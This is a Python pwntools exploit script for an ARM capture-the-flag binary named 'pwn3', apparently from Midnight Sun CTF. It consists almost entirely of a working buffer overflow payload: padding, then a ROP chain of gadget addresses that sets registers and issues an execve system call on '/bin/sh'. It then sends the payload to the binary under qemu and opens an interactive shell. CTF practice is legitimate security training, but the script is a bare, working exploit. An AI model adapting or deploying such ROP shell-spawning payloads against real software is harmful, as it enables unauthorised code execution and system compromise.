#!/usr/bin/env python3

from pwn import *

payload = (
    b"A" * 140 +

    p32(0x00010170) + # : pop {r3, pc}
    p32(0x43434343) +
    p32(0x00036359) + #  (0x00036359): pop {r0, r1, r2, r6, r7, pc};
    p32(0x00049018) + #  /bin/sh
    p32(0x0) + # r1
    p32(0x0) + # r2
    p32(0x44444444) + # r6
    p32(0xb) + # r7 - execve
    p32(0x00010915) + # (0x00010915): svc #0; pop {r7, pc}; 
    p32(0x49494949)
)
payload += b"B" * (511 - len(payload))
with open("input", "wb+") as f:
    f.write(payload)

#io = process(["qemu-arm", "./pwn3"])
io = process(["qemu-arm", "-g", "2222", "./pwn3"])
#io = remote("pwn3-01.play.midnightsunctf.se", 10003)

io.recvuntil("buffer: ")
io.sendline(payload)

io.interactive()
